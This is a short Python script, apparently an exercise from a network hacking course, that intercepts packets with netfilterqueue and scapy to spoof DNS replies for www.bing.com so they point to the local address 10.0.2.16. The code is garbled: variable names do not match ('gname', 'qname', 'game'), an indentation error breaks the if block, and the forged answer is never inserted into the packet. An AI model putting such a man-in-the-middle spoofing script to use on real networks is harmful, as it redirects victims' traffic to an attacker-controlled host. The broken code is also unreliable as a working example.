#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        gname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in game:
        print(" -/- Spoofing Target")
        answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")



    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()